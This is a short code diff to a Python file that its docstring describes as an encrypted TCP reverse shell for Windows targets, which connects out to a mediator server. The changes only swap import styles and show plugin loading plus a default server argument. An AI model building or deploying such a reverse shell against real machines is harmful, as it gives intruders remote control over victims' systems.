@@ -4,12 +4,12 @@ Program: windowsTarget.py
 Description: End-to-end encrypted TCP reverse shell -- connects to mediator server to be bridged to the reverse shell handler client connection
 """
 
-import argparse
+from argparse import ArgumentParser
 from Crypto.Cipher import AES
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
-import inspect
+from inspect import getmembers, isclass
 from pathlib import Path
 try:
     from . import plugins
@@ -32,7 +32,7 @@ class WindowsRShell:
         # self.cipherKey defined in WindowsRShell.run()
 
     def loadPlugins(self):
-        commandClasses = inspect.getmembers(plugins, inspect.isclass)
+        commandClasses = getmembers(plugins, isclass)
         commandClasses.pop(0)
         externalCommands = dict()
         for className, commandClass in commandClasses:
@@ -131,7 +131,7 @@ class WindowsRShell:
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="")
+    parser = ArgumentParser(description="")
     parser.add_argument("-c", "--connection-key", dest="connectionKey", action="store")
     parser.add_argument("-s", "--server", dest="serverAddr", action="store",
                         default="example.com")
